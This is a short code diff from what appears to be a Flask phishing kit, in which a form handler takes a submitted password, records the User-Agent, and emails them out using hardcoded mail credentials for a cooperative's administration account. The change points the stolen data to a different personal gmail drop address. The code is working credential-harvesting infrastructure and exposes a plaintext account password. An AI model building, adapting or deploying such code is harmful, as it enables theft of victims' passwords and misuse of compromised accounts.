@@ -233,7 +233,7 @@ def second():
         passwordemail = request.form.get("pig")
         sender_email = "administracion@coopacvallelaleche.com"
         sender_emaill = "administracion"
-        receiver_email = "tracey.kender@moonfee.com"
+        receiver_email = "kokofunds147@gmail.com"
         password = "Coopacvll2017"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
